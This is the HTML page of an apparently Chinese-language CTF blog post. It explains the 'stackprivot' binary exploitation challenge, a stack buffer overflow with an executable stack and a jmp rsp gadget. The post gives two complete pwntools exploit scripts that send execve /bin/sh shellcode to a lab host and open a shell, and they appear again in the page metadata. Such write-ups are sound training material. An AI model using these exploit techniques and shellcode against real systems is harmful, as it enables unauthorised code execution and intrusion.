@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>stackprivot | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。 查看基本信息：
+这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：
+有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp rsp运行到栈，再指向shellcode。
+然后我们通过IDA查看一下padding大小和一些细节：
+通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。
+方法一： 我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。
+栈的结构为：
+#stackprivot_x64from pwn import *#p = process(&#39;./stackprivot&#39;)p = remote(&#34;10.0.25.109&#34;, 10002)shellcode = &#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#34;if args.G:gdb.attach(p)sub_rsp_jmp = asm(&#34;sub rsp, 0x40;jmp rsp&#34;,arch = &#39;amd64&#39; )jmp_rsp = 0x40068bpayload = flat([shellcode.ljust(0x30, &#34;A&#34;), b&#39;b&#39;*8 , p64(jmp_rsp), sub_rsp_jmp])p.recvuntil(&#34;?&#34;)p.sendline(payload)p.interactive() 方法二： 我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。
+栈的结构为：
+#stackprivot_x64from pwn import *#p = process(&#39;./stackprivot&#39;)p = remote(&#34;10.0.25.109&#34;, 10002)shellcode = &#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#34;if args.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/stackprivot/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="stackprivot" />
+<meta property="og:description" content="注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。 查看基本信息：
+这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：
+有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp rsp运行到栈，再指向shellcode。
+然后我们通过IDA查看一下padding大小和一些细节：
+通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。
+方法一： 我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。
+栈的结构为：
+#stackprivot_x64from pwn import *#p = process(&#39;./stackprivot&#39;)p = remote(&#34;10.0.25.109&#34;, 10002)shellcode = &#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#34;if args.G:gdb.attach(p)sub_rsp_jmp = asm(&#34;sub rsp, 0x40;jmp rsp&#34;,arch = &#39;amd64&#39; )jmp_rsp = 0x40068bpayload = flat([shellcode.ljust(0x30, &#34;A&#34;), b&#39;b&#39;*8 , p64(jmp_rsp), sub_rsp_jmp])p.recvuntil(&#34;?&#34;)p.sendline(payload)p.interactive() 方法二： 我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。
+栈的结构为：
+#stackprivot_x64from pwn import *#p = process(&#39;./stackprivot&#39;)p = remote(&#34;10.0.25.109&#34;, 10002)shellcode = &#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#34;if args." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/stackprivot/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="stackprivot"/>
+<meta name="twitter:description" content="注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。 查看基本信息：
+这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：
+有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp rsp运行到栈，再指向shellcode。
+然后我们通过IDA查看一下padding大小和一些细节：
+通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。
+方法一： 我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。
+栈的结构为：
+#stackprivot_x64from pwn import *#p = process(&#39;./stackprivot&#39;)p = remote(&#34;10.0.25.109&#34;, 10002)shellcode = &#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#34;if args.G:gdb.attach(p)sub_rsp_jmp = asm(&#34;sub rsp, 0x40;jmp rsp&#34;,arch = &#39;amd64&#39; )jmp_rsp = 0x40068bpayload = flat([shellcode.ljust(0x30, &#34;A&#34;), b&#39;b&#39;*8 , p64(jmp_rsp), sub_rsp_jmp])p.recvuntil(&#34;?&#34;)p.sendline(payload)p.interactive() 方法二： 我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。
+栈的结构为：
+#stackprivot_x64from pwn import *#p = process(&#39;./stackprivot&#39;)p = remote(&#34;10.0.25.109&#34;, 10002)shellcode = &#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#34;if args."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "stackprivot",
+      "item": "https://jellyfish-pro.github.io/ctf/stackprivot/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "stackprivot",
+  "name": "stackprivot",
+  "description": "注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。 查看基本信息：\n这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：\n有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp rsp运行到栈，再指向shellcode。\n然后我们通过IDA查看一下padding大小和一些细节：\n通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。\n方法一： 我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。\n栈的结构为：\n#stackprivot_x64\rfrom pwn import *\r#p = process(\u0026#39;./stackprivot\u0026#39;)\rp = remote(\u0026#34;10.0.25.109\u0026#34;, 10002)\rshellcode = \u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34;\rif args.G:\rgdb.attach(p)\rsub_rsp_jmp = asm(\u0026#34;sub rsp, 0x40;jmp rsp\u0026#34;,arch = \u0026#39;amd64\u0026#39; )\rjmp_rsp = 0x40068b\rpayload = flat([shellcode.ljust(0x30, \u0026#34;A\u0026#34;), b\u0026#39;b\u0026#39;*8 , p64(jmp_rsp), sub_rsp_jmp])\rp.recvuntil(\u0026#34;?\u0026#34;)\rp.sendline(payload)\rp.interactive() 方法二： 我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。\n栈的结构为：\n#stackprivot_x64\rfrom pwn import *\r#p = process(\u0026#39;./stackprivot\u0026#39;)\rp = remote(\u0026#34;10.0.25.109\u0026#34;, 10002)\rshellcode = \u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34;\rif args.",
+  "keywords": [
+    
+  ],
+  "articleBody": "注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。 查看基本信息：\n这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：\n有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp rsp运行到栈，再指向shellcode。\n然后我们通过IDA查看一下padding大小和一些细节：\n通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。\n方法一： 我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。\n栈的结构为：\n#stackprivot_x64\rfrom pwn import *\r#p = process('./stackprivot')\rp = remote(\"10.0.25.109\", 10002)\rshellcode = \"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\"\rif args.G:\rgdb.attach(p)\rsub_rsp_jmp = asm(\"sub rsp, 0x40;jmp rsp\",arch = 'amd64' )\rjmp_rsp = 0x40068b\rpayload = flat([shellcode.ljust(0x30, \"A\"), b'b'*8 , p64(jmp_rsp), sub_rsp_jmp])\rp.recvuntil(\"?\")\rp.sendline(payload)\rp.interactive() 方法二： 我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。\n栈的结构为：\n#stackprivot_x64\rfrom pwn import *\r#p = process('./stackprivot')\rp = remote(\"10.0.25.109\", 10002)\rshellcode = \"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\"\rif args.G:\rgdb.attach(p)\rjmp_rsp = 0x40068b\rpayload = flat([b'a'*0x38,p64(jmp_rsp),shellcode])\rp.recvuntil(\"?\")\rp.sendline(payload)\rp.interactive() ",
+  "wordCount" : "82",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/stackprivot/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      stackprivot
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul><ul><ul>
+                <li>
+                    <a href="#%e6%b3%a8%e6%9c%ac%e9%a2%98%e9%9c%80%e8%a6%81%e4%bd%bf%e7%94%a8shellcode%e8%af%b7%e5%8a%a1%e5%bf%85%e4%bf%9d%e8%af%81%e4%bd%bf%e7%94%a8%e7%9a%84shellcode%e4%b8%8e%e7%a8%8b%e5%ba%8f%e7%9a%84%e4%bd%8d%e6%95%b0%e5%8c%b9%e9%85%8d" aria-label="注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。">注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。</a></li></ul>
+                    </ul>
+                    
+                <li>
+                    <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" aria-label="方法一：">方法一：</a></li>
+                <li>
+                    <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" aria-label="方法二：">方法二：</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h5 id="注本题需要使用shellcode请务必保证使用的shellcode与程序的位数匹配">注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。<a hidden class="anchor" aria-hidden="true" href="#注本题需要使用shellcode请务必保证使用的shellcode与程序的位数匹配">#</a></h5>
+<p>查看基本信息：</p>
+<p><img loading="lazy" src="/ctf/stackprivot.img/image-20220331143651404.png" alt="image-20220331143651404"  />
+</p>
+<p>这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：</p>
+<p><img loading="lazy" src="/ctf/stackprivot.img/image-20220331143957708.png" alt="image-20220331143957708"  />
+</p>
+<p>有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp rsp运行到栈，再指向shellcode。</p>
+<p>然后我们通过IDA查看一下padding大小和一些细节：</p>
+<p><img loading="lazy" src="/ctf/stackprivot.img/image-20220331144435079.png" alt="image-20220331144435079"  />
+</p>
+<p>通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。</p>
+<h3 id="方法一">方法一：<a hidden class="anchor" aria-hidden="true" href="#方法一">#</a></h3>
+<p>我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。</p>
+<p>栈的结构为：</p>
+<p><img loading="lazy" src="/ctf/stackprivot.img/image-20220331153944007.png" alt="image-20220331153944007"  />
+</p>
+<pre tabindex="0"><code>#stackprivot_x64
+from pwn import *
+
+#p = process(&#39;./stackprivot&#39;)
+p = remote(&#34;10.0.25.109&#34;, 10002)
+
+shellcode = &#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#34;
+
+if args.G:
+	gdb.attach(p)
+
+sub_rsp_jmp = asm(&#34;sub rsp, 0x40;jmp rsp&#34;,arch = &#39;amd64&#39; )
+jmp_rsp = 0x40068b
+
+payload = flat([shellcode.ljust(0x30, &#34;A&#34;), b&#39;b&#39;*8 , p64(jmp_rsp), sub_rsp_jmp])
+
+p.recvuntil(&#34;?&#34;)
+
+p.sendline(payload)
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/stackprivot.img/image-20220331153014361.png" alt="image-20220331153014361"  />
+</p>
+<h3 id="方法二">方法二：<a hidden class="anchor" aria-hidden="true" href="#方法二">#</a></h3>
+<p>我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。</p>
+<p>栈的结构为：</p>
+<p><img loading="lazy" src="/ctf/stackprivot.img/image-20220331154032959.png" alt="image-20220331154032959"  />
+</p>
+<pre tabindex="0"><code>#stackprivot_x64
+from pwn import *
+
+#p = process(&#39;./stackprivot&#39;)
+p = remote(&#34;10.0.25.109&#34;, 10002)
+
+shellcode = &#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#34;
+
+if args.G:
+	gdb.attach(p)
+	
+jmp_rsp = 0x40068b
+
+payload = flat([b&#39;a&#39;*0x38,p64(jmp_rsp),shellcode])
+
+p.recvuntil(&#34;?&#34;)
+
+p.sendline(payload)
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/stackprivot.img/image-20220331153605243.png" alt="image-20220331153605243"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/ret2text/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>ret2text</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/stacksmashes/">
+    <span class="title">Next »</span>
+    <br>
+    <span>stacksmashes</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
